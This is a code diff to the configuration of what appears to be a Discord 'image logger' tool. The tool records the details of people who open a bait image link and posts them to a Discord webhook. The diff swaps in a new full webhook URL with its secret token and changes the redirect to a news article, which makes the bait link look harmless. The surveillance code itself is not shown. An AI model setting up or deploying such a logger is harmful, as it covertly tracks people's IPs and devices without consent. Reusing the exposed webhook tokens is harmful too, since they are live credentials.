@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1150675813038030858/ypqAR4-poCrIhzRCdTfB25LFtNjfFAI2Cc2UwJUPS_prMgcSbyjLHVtY_DVo3_2qQpaZ",
+    "webhook": "https://discordapp.com/api/webhooks/1397596068597993573/kQ6QWxtz-aa3GjSTmib1JuvNnfK0Q_l6iecKsfhj5Ay9Hn49PqlzQTm8VegHwdDPjMnz",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://wehdatclub.jo/" # Link to the webpage to redirect to 
+        "page": "https://jo24.net/article/539190" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
